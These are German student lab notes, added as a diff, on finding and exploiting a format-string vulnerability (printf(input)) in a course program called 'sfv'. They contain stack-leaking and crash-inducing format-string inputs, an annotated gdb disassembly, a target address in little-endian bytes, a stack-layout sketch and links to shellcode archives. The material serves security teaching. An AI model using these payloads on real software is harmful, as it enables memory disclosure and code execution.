@@ -1,0 +1,220 @@
+http://www.online-tutorials.net/security/buffer-overflow-tutorial-teil-1-grundlagen/tutorials-t-27-282.html
+
+
+1.a) Fehlersuche
+
+a)
+
+http://en.wikipedia.org/wiki/Uncontrolled_format_string
+printf(); falsch benutzt:
+
+else {
+      printf(input);
+    
+}
+
+Eingabe %x gibt den stack aus
+same here:
+echo -ne "secret\n1\n%x\n2\n\j" | ./sfv
+
+-> Hier http://julianor.tripod.com/bc/formatstring-1.2.pdf
+
+b)
+
+checkout variable ta??
+
+1b.) Crash finden
+
+simon@Cottonmouth:~/studium/sse/lab1/app0/src-vuln/src$ echo "%s%s%s%s%s%s%s%s%s" | ./sfv 
+Passwort eingeben: 
+%s%s%s%s%s%s%s%s%s
+Segmentation fault
+
+-> Adressen der Variablen rauf rausfinden
+
+simon@Cottonmouth:~/studium/sse/lab1/app0/src-vuln/src$ echo "%08x.%08x.%08x.%08x.%08x.\n" | ./sfv 
+Passwort eingeben: 
+bff689e4.b7769440.78383025.3830252e
+
+1c.) startCalculator verstehen
+
+simon@Cottonmouth:~/studium/sse/lab1/app0/src-vuln/src$ gdb sfv
+GNU gdb (GDB) 7.4.1-debian
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu".
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>...
+Reading symbols from /media/share/share/studium_temp/sse/lab1/app0/src-vuln/src/sfv...(no debugging symbols found)...done.
+(gdb) disas startCalculator
+Dump of assembler code for function startCalculator:
+   0x0804862f <+0>:	push   %ebp			// Sichert den ESB
+   0x08048630 <+1>:	mov    %esp,%ebp		// Kopiert den ESP(Stack pointer) in den ESB
+   0x08048632 <+3>:	sub    $0x60,%esp 		// Erh?ht den ESP um 0x60(=96) und macht damit mehr Platz f?r beide Buffer 
+   0x08048635 <+6>:	movl   $0x0,-0x4(%ebp)		//
+   0x0804863c <+13>:	movl   $0x80488e7,(%esp)
+   0x08048643 <+20>:	call   0x8048410 <printf@plt>
+   0x08048648 <+25>:	mov    0x8049b70,%eax
+   0x0804864d <+30>:	mov    %eax,0x8(%esp)
+   0x08048651 <+34>:	movl   $0x1e,0x4(%esp)
+   0x08048659 <+42>:	lea    -0x2a(%ebp),%eax
+   0x0804865c <+45>:	mov    %eax,(%esp)
+   0x0804865f <+48>:	call   0x8048420 <fgets@plt>
+   0x08048664 <+53>:	movl   $0x80488f0,(%esp)
+   0x0804866b <+60>:	call   0x8048410 <printf@plt>
+   0x08048670 <+65>:	mov    0x8049b70,%eax
+   0x08048675 <+70>:	mov    %eax,0x8(%esp)
+   0x08048679 <+74>:	movl   $0xa,0x4(%esp)
+   0x08048681 <+82>:	lea    -0x52(%ebp),%eax
+   0x08048684 <+85>:	mov    %eax,(%esp)
+   0x08048687 <+88>:	call   0x8048420 <fgets@plt>
+   0x0804868c <+93>:	movl   $0x8048904,(%esp)
+   0x08048693 <+100>:	call   0x8048410 <printf@plt>
+   0x08048698 <+105>:	mov    0x8049b70,%eax
+   0x0804869d <+110>:	mov    %eax,0x8(%esp)
+   0x080486a1 <+114>:	movl   $0x1e,0x4(%esp)
+   0x080486a9 <+122>:	lea    -0x48(%ebp),%eax
+   0x080486ac <+125>:	mov    %eax,(%esp)
+---Type <return> to continue, or q <return> to quit--- 
+   0x080486af <+128>:	call   0x8048420 <fgets@plt>
+   0x080486b4 <+133>:	movl   $0x804890d,(%esp)
+   0x080486bb <+140>:	call   0x8048430 <puts@plt>
+   0x080486c0 <+145>:	lea    -0x2a(%ebp),%eax
+   0x080486c3 <+148>:	mov    %eax,(%esp)
+   0x080486c6 <+151>:	call   0x8048410 <printf@plt>
+   0x080486cb <+156>:	lea    -0x52(%ebp),%eax
+   0x080486ce <+159>:	mov    %eax,(%esp)
+   0x080486d1 <+162>:	call   0x8048410 <printf@plt>
+   0x080486d6 <+167>:	lea    -0x48(%ebp),%eax
+   0x080486d9 <+170>:	mov    %eax,(%esp)
+   0x080486dc <+173>:	call   0x8048410 <printf@plt>
+   0x080486e1 <+178>:	movl   $0x8048926,(%esp)
+   0x080486e8 <+185>:	call   0x8048430 <puts@plt>
+   0x080486ed <+190>:	lea    -0x2a(%ebp),%eax
+   0x080486f0 <+193>:	mov    %eax,(%esp)
+   0x080486f3 <+196>:	call   0x8048480 <atoi@plt>
+   0x080486f8 <+201>:	mov    %eax,-0x8(%ebp)
+   0x080486fb <+204>:	lea    -0x48(%ebp),%eax
+   0x080486fe <+207>:	mov    %eax,(%esp)
+   0x08048701 <+210>:	call   0x8048480 <atoi@plt>
+   0x08048706 <+215>:	mov    %eax,-0xc(%ebp)
+   0x08048709 <+218>:	movzbl -0x52(%ebp),%eax
+   0x0804870d <+222>:	cmp    $0x2b,%al
+   0x0804870f <+224>:	jne    0x804872b <startCalculator+252>
+   0x08048711 <+226>:	mov    -0xc(%ebp),%eax
+   0x08048714 <+229>:	mov    -0x8(%ebp),%edx
+   0x08048717 <+232>:	add    %edx,%eax
+---Type <return> to continue, or q <return> to quit---
+   0x08048719 <+234>:	mov    %eax,0x4(%esp)
+   0x0804871d <+238>:	movl   $0x804892c,(%esp)
+   0x08048724 <+245>:	call   0x8048410 <printf@plt>
+   0x08048729 <+250>:	jmp    0x804879b <startCalculator+364>
+   0x0804872b <+252>:	movzbl -0x52(%ebp),%eax
+   0x0804872f <+256>:	cmp    $0x2d,%al
+   0x08048731 <+258>:	jne    0x8048751 <startCalculator+290>
+   0x08048733 <+260>:	mov    -0xc(%ebp),%eax
+   0x08048736 <+263>:	mov    -0x8(%ebp),%edx
+   0x08048739 <+266>:	mov    %edx,%ecx
+   0x0804873b <+268>:	sub    %eax,%ecx
+   0x0804873d <+270>:	mov    %ecx,%eax
+   0x0804873f <+272>:	mov    %eax,0x4(%esp)
+   0x08048743 <+276>:	movl   $0x804892c,(%esp)
+   0x0804874a <+283>:	call   0x8048410 <printf@plt>
+   0x0804874f <+288>:	jmp    0x804879b <startCalculator+364>
+   0x08048751 <+290>:	movzbl -0x52(%ebp),%eax
+   0x08048755 <+294>:	cmp    $0x2a,%al
+   0x08048757 <+296>:	jne    0x8048772 <startCalculator+323>
+   0x08048759 <+298>:	mov    -0x8(%ebp),%eax
+   0x0804875c <+301>:	imul   -0xc(%ebp),%eax
+   0x08048760 <+305>:	mov    %eax,0x4(%esp)
+   0x08048764 <+309>:	movl   $0x804892c,(%esp)
+   0x0804876b <+316>:	call   0x8048410 <printf@plt>
+   0x08048770 <+321>:	jmp    0x804879b <startCalculator+364>
+   0x08048772 <+323>:	movzbl -0x52(%ebp),%eax
+   0x08048776 <+327>:	cmp    $0x2f,%al
+   0x08048778 <+329>:	jne    0x804879b <startCalculator+364>
+---Type <return> to continue, or q <return> to quit---
+   0x0804877a <+331>:	cmpl   $0x0,-0xc(%ebp)
+   0x0804877e <+335>:	je     0x804879b <startCalculator+364>
+   0x08048780 <+337>:	mov    -0x8(%ebp),%eax
+   0x08048783 <+340>:	mov    %eax,%edx
+   0x08048785 <+342>:	sar    $0x1f,%edx
+   0x08048788 <+345>:	idivl  -0xc(%ebp)
+   0x0804878b <+348>:	mov    %eax,0x4(%esp)
+   0x0804878f <+352>:	movl   $0x804892c,(%esp)
+   0x08048796 <+359>:	call   0x8048410 <printf@plt>
+   0x0804879b <+364>:	movl   $0x804892f,(%esp)
+   0x080487a2 <+371>:	call   0x8048410 <printf@plt>
+   0x080487a7 <+376>:	mov    0x8049b70,%eax
+   0x080487ac <+381>:	mov    %eax,0x8(%esp)
+   0x080487b0 <+385>:	movl   $0xa,0x4(%esp)
+   0x080487b8 <+393>:	lea    -0x52(%ebp),%eax
+   0x080487bb <+396>:	mov    %eax,(%esp)
+   0x080487be <+399>:	call   0x8048420 <fgets@plt>
+   0x080487c3 <+404>:	movzbl -0x52(%ebp),%eax
+   0x080487c7 <+408>:	cmp    $0x6a,%al
+   0x080487c9 <+410>:	je     0x80487d2 <startCalculator+419>
+   0x080487cb <+412>:	movl   $0x1,-0x4(%ebp)
+   0x080487d2 <+419>:	cmpl   $0x0,-0x4(%ebp)
+   0x080487d6 <+423>:	je     0x804863c <startCalculator+13>
+   0x080487dc <+429>:	leave  
+   0x080487dd <+430>:	ret  
+
+
+0x0804862f =
+-> \x2f\x86\x04\x08
+
+1d.) Stackabbbild vorstellen
+
+Stack: z.B 0xFFFFFF und waechst nach unten
+--
+
+echo -ne "secret\n08x.%08x.%08x.%08x.%08x\n+\n1" | ./sfv 
+Passwort eingeben: 
+Zahl 1: Operand (+,-,/,*): Zahl 2: Ergebnis fuer Rechnung: 
+08x.0000001e.b774d440.0a2b0000.bfe19e00
++
+1=====
+9
+
+
+Funktion startCalculator:
+
+Stock top
+[...]
+
+Funktionsvariablen, hier nicht vorhanden
+Ruecksprungaddr
+EBP
+a[29]
+...
+a[0]
+b[29]
+...
+b[0]
+op[29]
+...
+op[0]
+
+[..]
+Stack Bottom
+
+->
+printf(a)
+
+gibt zuerst op aus, dann 
+
+
+1e) Shellcode
+
+http://de.wikipedia.org/wiki/Shellcode
+http://www.shell-storm.org/shellcode/
+
+http://www.shell-storm.org/shellcode/files/shellcode-589.php
+
+echo -ne "secret\nAAAABBBB|%u%u%u%u%u%u|%08x|%s\n+\n1" | ./sfv && echo ""
+
+http://stackoverflow.com/questions/5672996/format-string-vulnerability-printf
